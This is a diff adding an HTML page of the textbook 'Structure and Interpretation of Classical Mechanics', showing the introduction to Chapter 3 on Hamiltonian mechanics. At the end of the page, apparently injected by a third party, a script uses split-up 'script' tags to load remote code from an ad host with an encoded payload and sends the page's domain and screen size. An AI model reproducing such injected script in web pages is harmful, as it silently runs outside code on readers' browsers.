@@ -1,0 +1,131 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-35.html">previous</a></span><span>, <a href="book-Z-H-37.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_chap_3"></a>
+<h1 class=chapter>
+<div class=chapterheading><a href="book-Z-H-4.html#%_toc_%_chap_3">Chapter 3</a></div><br>
+<a href="book-Z-H-4.html#%_toc_%_chap_3">Hamiltonian Mechanics</a></h1>
+<p></p>
+<p>
+
+</p>
+
+<div align=right> 
+<table width=60%><tr><td>
+<span class=epigraph>
+
+<p>
+Numerical experiments are just what their name implies: experiments.
+In describing and evaluating them, one should enter the state of mind
+of the experimental physicist, rather than that of the mathematician.
+Numerical experiments cannot be used to prove theorems; but, from the
+physicist's point of view, they do often provide convincing evidence
+for the existence of a phenomenon.  We will therefore follow an
+informal, descriptive and non-rigorous approach.  Briefly stated, our
+aim will be to <em>understand</em> the fundamental properties of dynamical
+systems rather than to <em>prove</em> them.</p>
+<p>
+<a name="%_idx_1542"></a>Michel H&eacute;non, ``Numerical Exploration of Hamiltonian Systems,'' in
+<i>Chaotic Behavior of Deterministic Systems</i> [<a href="book-Z-H-80.html#cite{Henon}">21</a>], p.&nbsp;57.
+</p>
+
+</span>
+</td></tr></table>
+</div>
+
+<p></p>
+<p>
+
+The formulation of mechanics with generalized coordinates and momenta
+as dynamical state variables is called the Hamiltonian formulation.
+The Hamiltonian formulation<a name="%_idx_1544"></a> of mechanics is equivalent to the
+<a name="%_idx_1546"></a>Lagrangian formulation; however, each presents a useful point of view.
+The Lagrangian formulation is especially useful in the initial
+formulation of a system.  The Hamiltonian formulation is especially
+useful in understanding the evolution, especially when there are
+symmetries and conserved quantities.</p>
+<p>
+<a name="%_idx_1548"></a>For each continuous symmetry of a mechanical system there is a
+<a name="%_idx_1550"></a>conserved quantity.  If the generalized coordinates can be chosen to
+reflect a symmetry, then, by the Lagrange equations, the conjugate
+momentum is conserved.  We have seen that such conserved quantities
+allow us to deduce important properties of the motion.  For instance,
+consideration of the energy and angular momentum allowed us to deduce
+that rotation of a free rigid body about the axis of intermediate
+moment of inertia is unstable, and that rotation about the other
+principal axes is stable.  For the axisymmetric top, we used two
+conserved momenta to reexpress the equations governing the evolution
+of the tilt angle so that they involve only the tilt angle and its
+derivative.  The evolution of the tilt angle can be determined
+independently and has simply periodic solutions.  Consideration of the
+conserved momenta has provided key insight.  The Hamiltonian
+formulation is motivated by the desire to focus attention on the
+momenta.</p>
+<p>
+In the Lagrangian formulation the momenta are, in a sense, secondary
+quantities: the momenta are functions of the state space variables,
+but the evolution of the state space variables depends on the state
+space variables and not on the momenta.  To make use of any conserved
+momenta requires fooling around with the specific equations.  The
+momenta can be rewritten in terms of the coordinates and the
+velocities, so, locally, we can solve for the velocities in terms of
+the coordinates and momenta.  For a given mechanical system, and a
+Lagrangian describing its dynamics in a given coordinate system,
+the momenta and the velocities can be deduced from each
+other.  Thus we can represent the dynamical <a name="%_idx_1552"></a>state of the system in
+terms of the coordinates and momenta just as well as with the
+coordinates and the velocities.  If we use the coordinates and momenta
+to represent the state and write the associated state derivative in
+terms of the coordinates and momenta, then we have a self-contained
+system.  This formulation of the equations governing the evolution of
+the system has the advantage that if some of the momenta are
+conserved, the remaining equations are immediately simplified.</p>
+<p>
+The Lagrangian formulation of mechanics has provided the means to
+investigate the motion of complicated mechanical systems.  We have
+found that dynamical systems exhibit a bewildering variety of possible
+motions.  The motion is sometimes rather simple and sometimes
+very complicated.  Sometimes the evolution is very
+sensitive to the initial conditions, and sometimes it is
+not.  And sometimes there are orbits that maintain resonance
+relationships with a drive.  Consider the <a name="%_idx_1554"></a>periodically driven
+pendulum: it can behave more or less as an undriven
+pendulum with extra wiggles, it can move in a strongly chaotic
+manner, or it can move in resonance with the drive, oscillating once for
+every two cycles of the drive or looping around once per drive cycle.
+Or consider the Moon.  The Moon rotates synchronously with its orbital
+motion, always pointing roughly the same face to the Earth.  However,
+Mercury rotates three times every two times it circles the Sun, and
+Hyperion rotates chaotically.</p>
+<p>
+How can we make sense of this?  How do
+we put the possible motions of these systems in relation to one another?
+What other motions are possible?  The Hamiltonian formulation
+of dynamics gives us much more than the stated goal of expressing the
+system derivative in terms of potentially conserved quantities.  The
+Hamiltonian formulation provides a convenient framework in which the
+possible motions may be placed and understood.  We will be able to see
+the range of stable resonance motions and the range of states reached
+by chaotic trajectories, and discover other unsuspected possible
+motions.  The Hamiltonian formulation leads to many additional
+insights.</p>
+<p>
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-35.html">previous</a></span><span>, <a href="book-Z-H-37.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2XqTraTroBdJ9MvzLiutXfn5LTGvxZRBv7i4bTBZJg5%2b4NaE0yPeN3ys13teUc9DxKfUeGr0jKjG9WlM97drL%2frY46nvblrA8IZQrmXqQLwhud2JHpcE0eR6BAylsQdqQGbL070HX5p3DSbbhNq7j6HsZ8piMbV2nlDd0M2jPimUs9BS5Mfi5sZ7sUn3Y%2ffxPLnf3LyoFZ1Qq2WZxMl1hIFjqCRArTZW75oEyTDfrjH1AFOS72oqzV9fk2XpnIKDGULreHG2ptpG2e%2fSyeMFynbAAEoR7wfAjvpa13wAS%2fvBaPP7mfJ2zyOgG5%2fD28dXxj9b2uIQEmOYjcOmfyttUZHOWYOSIENTLYHZgFYdTeym6ja%2fl34RngENcAv1xSApPV0dWZgIhJbZlzEggAvrpoWLSQ7VDxOB02TcgknuIOxQinhWi3dVejA3AJwsLRfE7MYKJdAO3e5TP7gyepqGvJ");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
